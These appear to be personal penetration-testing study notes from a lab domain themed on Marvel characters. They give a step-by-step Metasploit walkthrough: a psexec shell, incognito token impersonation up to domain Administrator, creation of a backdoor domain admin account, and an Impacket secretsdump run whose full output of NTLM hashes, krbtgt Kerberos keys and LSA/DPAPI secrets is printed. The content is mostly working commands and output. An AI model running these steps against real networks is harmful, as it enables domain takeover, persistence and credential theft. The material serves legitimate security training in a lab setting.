#token #metasploit #incognito #secretsdump 

What are tokens?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

Two types:
- **Delegate** - created for logging into a machine or using Remote Desktop
- **Impersonate** - "non-interactive" such as attaching a network drive or a domain logon script

- can do in metasploit with incognito tool. `load incognito`
	- `impersonate_token <domain>\\<user>`

Step 1: start `msfconsole` and get shell
- search `psexec` select `exploit/windows/smb/psexec`
- set `options`
	- Payload to x64
	- RHOSTS - PUNISHER Box
	- SMBDomain - MARVEL.local
	- SMBPass - Password1
	- SMBUser - fcastle
- get shell

Step 2: `load incognito`
- check with `help`, look at bottom for what is loaded and its commands

Step 3: list tokens
- `list_token -u`
```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available
```

Step 4: Impersonate user token (skip to Step 6 for admin, 4-5 is proof of concept)
- `impersonate_token marvel\\fcastle`
```
meterpreter > impersonate_token marvel\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
meterpreter > shell
Process 10228 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\fcastle
```

Step 5:  Ctrl + C, y, `rev2self` to get back to NT AUTHORITY/SYSTEM
```
C:\Windows\system32>^C
Terminate channel 2? [y/N]  y
meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Step 6: Impersonate admin token
```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
meterpreter > getuid
Server username: MARVEL\Administrator
```

Step 7: Create domain admin user `hawkeye` and add the user to Domain Admins group
```
meterpreter > shell
Process 3220 created.
Channel 3 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\administrator

C:\Windows\system32>net user /add hawkeye Password1@ /domain
net user /add hawkeye Password1@ /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.

C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.
```

- Confirm Domain Admins using hawkeye user, DC IP, and `secretsdump.py` 
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(10:06:02)──> secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132                           ──(Wed,Jul03)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x42e74ffe3701c01efc4fdb3af0db2fcd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:49ad2931ff2bda80c74a3220930d905e9ca3f9a992760277d06a0371a51f8ab8
MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:5d1a7747024009e7f527e18d648414a0
MARVEL\HYDRA-DC$:des-cbc-md5:203b79f797e6babf
MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:20b10a26527aaed298fc553866b81642:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc3b7bfe34b69d3596c85aecab23c876ba33575e1
dpapi_userkey:0x73b4ff165058d6780de2a7b662b19483e5d89371
[*] NL$KM 
 0000   91 BB 2D 18 AD 62 F2 AC  4C 0B A9 C9 B4 C2 21 E7   ..-..b..L.....!.
 0010   0A 34 B4 A6 8C CB 13 EA  B6 A2 6A 83 33 2B B2 2D   .4........j.3+.-
 0020   91 6C AB A0 2D D7 EC 80  26 B8 CF EE 67 8F F3 D0   .l..-...&...g...
 0030   CA 65 DB 75 D2 83 57 D0  5A 5B F1 52 01 E1 06 65   .e.u..W.Z[.R...e
NL$KM:91bb2d18ad62f2ac4c0ba9c9b4c221e70a34b4a68ccb13eab6a26a83332bb22d916caba02dd7ec8026b8cfee678ff3d0ca65db75d28357d05a5bf15201e10665
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:60163dd27f6c523edea3d171b2687db4:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
MARVEL.local\SQLService:1107:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
KzhlRYzkCb:1110:aad3b435b51404eeaad3b435b51404ee:6a9067dc6d904c7b3b1429540357683f:::
hawkeye:1111:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:20b10a26527aaed298fc553866b81642:::
THEPUNISHER$:1108:aad3b435b51404eeaad3b435b51404ee:af4c18929a5251f6c038e6e45416047b:::
SPIDERMAN$:1109:aad3b435b51404eeaad3b435b51404ee:5138b9cf4ccdda28a829bfc5e69f2d36:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:22bbb1d6b72d5444198723a7fab7fe9e70238880fd19b576d8edb582c0f1f50c
Administrator:aes128-cts-hmac-sha1-96:9572a284c9e1f886547521b786aadbb2
Administrator:des-cbc-md5:c28a6e0286983d04
krbtgt:aes256-cts-hmac-sha1-96:981ff0f170cdae1af3126454e6be4992a97ab314de13310f0328a09067aac089
krbtgt:aes128-cts-hmac-sha1-96:cb381cd42cd961408bce258de2880686
krbtgt:des-cbc-md5:4546cb2f1c13c754
MARVEL.local\tstark:aes256-cts-hmac-sha1-96:648e4d16720b95bb2b18179624f44ca29f10961666f26caa4f78c77ec18f88e3
MARVEL.local\tstark:aes128-cts-hmac-sha1-96:e168d44446c0d284a38e135222b0c0b6
MARVEL.local\tstark:des-cbc-md5:734601e3fefd4a6e
MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
MARVEL.local\pparker:aes256-cts-hmac-sha1-96:5fc6b0c6792c9a3b62432eda4a61e5c71efc2c57f5466abea92ac4c16fcae580
MARVEL.local\pparker:aes128-cts-hmac-sha1-96:7693d96d854240b8c654c1f8a86387e1
MARVEL.local\pparker:des-cbc-md5:e3d640734938ec34
MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93
MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e
MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba
KzhlRYzkCb:aes256-cts-hmac-sha1-96:4c1508568c6e2d204fb49d867e633f838940fee3d120b9cf9628bcd675329164
KzhlRYzkCb:aes128-cts-hmac-sha1-96:ac7d137417a8210b27575750ef41a407
KzhlRYzkCb:des-cbc-md5:dc133b3b45e9a25e
hawkeye:aes256-cts-hmac-sha1-96:70306b40ac0b9da21903551fa70b3191b61d88749e356b11cbe93721a0d3b471
hawkeye:aes128-cts-hmac-sha1-96:2ee48035a17365b1951d8a8105c917e4
hawkeye:des-cbc-md5:01f758f731b6757c
HYDRA-DC$:aes256-cts-hmac-sha1-96:49ad2931ff2bda80c74a3220930d905e9ca3f9a992760277d06a0371a51f8ab8
HYDRA-DC$:aes128-cts-hmac-sha1-96:5d1a7747024009e7f527e18d648414a0
HYDRA-DC$:des-cbc-md5:40929e25ad6b984c
THEPUNISHER$:aes256-cts-hmac-sha1-96:62d4133ea5d685cfbafb7561616d3f1a4e6142fc864bb26566868af3e257c4f9
THEPUNISHER$:aes128-cts-hmac-sha1-96:931166d2242e0b110c30fb7266cc1db8
THEPUNISHER$:des-cbc-md5:439d4aa1f4da9ef1
SPIDERMAN$:aes256-cts-hmac-sha1-96:bc448221c043342db8a280693156b7404eb26700b71b8faa6e1f341cb9a65864
SPIDERMAN$:aes128-cts-hmac-sha1-96:e6022353a943b0c1a4677ac278a3c9cf
SPIDERMAN$:des-cbc-md5:7334755bba2c0149
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

